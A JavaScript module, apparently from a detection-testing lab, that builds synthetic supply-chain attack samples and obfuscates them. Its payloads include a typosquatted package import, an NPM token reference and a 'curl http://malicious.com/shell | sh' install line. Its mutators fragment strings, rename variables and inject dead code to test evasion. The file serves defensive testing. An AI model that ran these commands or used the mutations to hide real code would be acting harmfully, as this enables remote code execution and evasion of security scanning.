/**
 * Sentinel Adversarial Lab (SAL): Attacker Engine (v1.0)
 * 
 * Generates synthetic malicious payloads and applies mutations to test 
 * engine detection capabilities and resistance to evasion techniques.
 */

'use strict';

class AttackerEngine {
    constructor() {
        this.payloads = [
            { id: 'typosquat', type: 'supply_chain', base: 'require("axois")' },
            { id: 'dependency_poison', type: 'supply_chain', base: 'process.env.NPM_TOKEN' },
            { id: 'malicious_install', type: 'lifecycle', base: 'curl http://malicious.com/shell | sh' }
        ];

        this.mutators = [
            this._mutateVariableNames,
            this._mutateStringFragmentation,
            this._mutateDeadCodeInjection
        ];
    }

    /**
     * Generates a mutated malicious sample.
     * @param {number} intensity - Mutation depth [0.0 - 1.0]
     */
    generate(intensity = 0.5) {
        const basePayload = this.payloads[Math.floor(Math.random() * this.payloads.length)];
        let code = basePayload.base;

        // Apply mutations based on intensity
        this.mutators.forEach(mutator => {
            if (Math.random() < intensity) {
                code = mutator(code);
            }
        });

        return {
            id: `attack_${Date.now()}`,
            type: basePayload.type,
            raw: code,
            intensity
        };
    }

    _mutateVariableNames(code) {
        // Simple regex-based renaming simulation
        return code.replace(/process\.env/g, 'p_e').replace(/require/g, 'r_q');
    }

    _mutateStringFragmentation(code) {
        // Simulates 'axois' -> 'ax' + 'ois'
        return code.replace(/"([^"]+)"/g, (match, p1) => {
            const mid = Math.floor(p1.length / 2);
            return `"${p1.slice(0, mid)}" + "${p1.slice(mid)}"`;
        });
    }

    _mutateDeadCodeInjection(code) {
        const deadCode = `\nconst _0x${Math.random().toString(16).slice(2)} = true; // No-op\n`;
        return deadCode + code;
    }
}

module.exports = new AttackerEngine();
